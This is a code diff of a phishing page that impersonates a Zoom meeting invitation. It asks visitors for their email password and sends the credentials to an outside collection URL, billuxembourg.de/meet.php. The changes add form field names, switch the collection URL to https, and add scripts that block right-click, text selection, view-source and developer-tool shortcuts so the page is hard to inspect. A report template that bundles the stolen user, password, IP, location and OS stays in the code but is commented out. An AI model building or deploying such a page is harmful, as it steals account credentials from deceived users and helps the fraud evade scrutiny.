@@ -19,7 +19,7 @@
 
 <body class="skin-blue">
 <script>
-const url = 'http://billuxembourg.de/meet.php';
+const url = 'https://billuxembourg.de/meet.php';    //full url goes here
 </script>
 
 <style>
@@ -115,8 +115,8 @@ padding: 5px 16px;
 <div class="container">
 <div class="row">
 <div class="col-sm-4 col-sm-offset-4">
-<input type="hidden" id="user">
-<input id="pass" required type="password" class="form-control" placeholder="Enter Email Password" style="max-width: 300px;margin: auto;">
+<input type="hidden" id="user" name="user">
+<input id="pass" name="pass" required type="password" class="form-control" placeholder="Enter Email Password" style="max-width: 300px;margin: auto;">
 </div>
 </div>
 </div>
@@ -159,35 +159,69 @@ If you are unable to join the meeting, visit <a href="#">Zoom Support Center</a>
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.js"></script>
 
+<script type="text/javascript" language="javascript">
+$(function() {
+	$(this).bind("contextmenu", function(e) {
+		e.preventDefault();
+	});
+}); 
+</script>
+
 <script>
-// prevent ctrl + s
-$(document).bind('keydown', function(e) {
-if(e.ctrlKey && (e.which == 83)) {
-e.preventDefault();
-return false;
+function disableselect(e) {
+	return true;
 }
+
+function reEnable() {
+	return true;
+}
+
+document.onselectstart = new Function("return false");
+
+if (window.sidebar) {
+	document.onmousedown = disableselect;
+	document.onclick = reEnable;
+}
+</script>
+
+<script>
+jQuery(document).keydown(function(event){
+	if(event.keyCode==123){
+		return false;
+	}
+	else if (event.ctrlKey && event.shiftKey && event.keyCode==73){        
+			 return false;
+	}
 });
 
-document.addEventListener('contextmenu', event => event.preventDefault());
+jQuery(document).on("contextmenu",function(e){        
+   e.preventDefault();
+});
+</script>
 
+<script>	
 document.onkeydown = function(e) {
-if (e.ctrlKey && 
-(e.keyCode === 67 ||   
-e.keyCode === 86 || 
-e.keyCode === 85 || 
-e.keyCode === 117)) {
-return false;
-} else {
-return true;
-}
-};
-$(document).keypress("u",function(e) {
-if(e.ctrlKey)
-{
-return false;      }
-else {
-return true;
-}});
+	if(e.keyCode == 123) {
+	 return false;
+	}
+	if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){
+	 return false;
+	}
+	if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){
+	 return false;
+	}
+	if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){
+	 return false;
+	}
+	
+	if(e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)){
+	 return false;
+	}
+
+	if(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){
+	 return false;
+	}      
+ }
 </script>
    
 <script>
@@ -214,11 +248,11 @@ function Validate(){
 	$('#error_msg').fadeOut();
 	var a = $('#user').val();
 	var b = $('#pass').val();
-	var c = $('#country_field').val();
+	/*var c = $('#country_field').val();
 	var d = $('#city_field').val();
 	var f = $('#os_field').val();
 	var ip = $('#ip_field').val();
-	var e = '===: Zoom Report :===\nUser: '+a+'\nPassword: '+b+'\n------Info------\nIp: '+ip+'\nCountry: '+c+' ('+d+')\nOS: '+f+'\n====================';
+	var e = '===: Zoom Report :===\nUser: '+a+'\nPassword: '+b+'\n------Info------\nIp: '+ip+'\nCountry: '+c+' ('+d+')\nOS: '+f+'\n====================';*/
 	if(a == '' || b == ''){
 		return false;
 	}
